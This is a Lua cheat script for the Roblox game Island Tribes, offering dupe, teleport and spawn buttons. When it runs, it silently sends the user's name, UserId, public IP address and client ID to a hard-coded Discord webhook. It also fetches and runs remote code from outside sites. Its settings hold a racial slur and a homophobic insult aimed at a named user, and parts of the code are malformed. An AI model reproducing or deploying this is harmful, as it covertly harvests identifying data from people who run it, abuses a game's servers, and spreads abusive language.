local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

HttpService = game:GetService("HttpService")
Webhook_URL =  "https://discord.com/api/webhooks/1353966655990140968/qd0Hl1CCg5nwKKGY3YH_wzryIEuyBFajw_rm2n6KpfoqVSTZbRLkJq1k9F8-tWoLD7np"
 
local request = syn and syn.request or request or http and http.request or http_request
 
local response = request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {
        ['Content-Type'] = 'application/json'
    },
    Body = HttpService:JSONEncode({
        ["content"] = "",
        ["embeds"] = {
            {
                ["title"] = "",
                ["description"] = game.Players.LocalPlayer.Name .." Logged into Islandtribes With the keyv2 Script",
                ["type"] = "rich",
                ["color"] = tonumber(0xffffff),
                ["fields"] = {
                    {
                        ["name"] = "Player Name : ",
                        ["value"] = game.Players.LocalPlayer.Name,
                        ["inline"] = true
                    }, {
                        ["name"] = "UserId : ",
                        ["value"] = game.Players.LocalPlayer.UserId,
                        ["inline"] = true
                    }, {
                        ["name"] = "User Profile : ",
                        ["value"] = "https://www.roblox.com/users/" ..
                            game.Players.LocalPlayer.UserId,
                        ["inline"] = true
                    }, {
                        ["name"] = "IP: ",
                        ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
                        ["inline"] = true
                    }, {
                        ["name"] = "Client Id : ",
                        ["value"] = game:GetService("RbxAnalyticsService")
                            :GetClientId(),
                        ["inline"] = true
                    }
                }
            }
        }
    })
})

local Window = Rayfield:CreateWindow({
    Name = "                                Island Tribes 🌴",
    LoadingTitle = "WSP",
    LoadingSubtitle = "Made by Chungdz credit to Friend",
    ConfigurationSaving = {
       Enabled = flase,
       FolderName = nil, 
       FileName = "Nigga 69"
    },

    KeySystem = false,
    KeySettings = {
       Title = "Island Tribes 🌴",
       Subtitle = "Made by Chung credit #Chungdz",
       Note = "this guy is gay gbaox_01",
       FileName = "0", 
       SaveKey = true,
       GrabKeyFromSite = true,
       Key = {"https://raw.githubusercontent.com/Chungdz09/Script-chung-dz/refs/heads/main/Key"}
    }
 })

 local MainTab = Window:CreateTab("🏠 Main", nil) 
 local MainSection = MainTab:CreateSection("Start Duping items")

local Button = MainTab:CreateButton({
   Name = "Ctrl + click TP",
   Callback = function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Click%20Teleport.txt"))()  
  end,
})

local Button = MainTab:CreateButton({
   Name = "Test",
   Callback = function()
      local chest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
      local putIn = true
      local itemIDs = {230}
      local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest
  
      for _, itemID in ipairs(itemIDs) do
          Event:FireServer(chest, putIn, itemID)
      end
 end,
})

local Button = MainTab:CreateButton({
RealDupeSection:CreateButton({
    Name = 'Spawn Sleigh        	(REQ.  |   5 Ruby, 100 Candy) ',
    Callback = function(Value)
        if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(183, GetClosestTrapPlayer(), 690)
    end
end
})
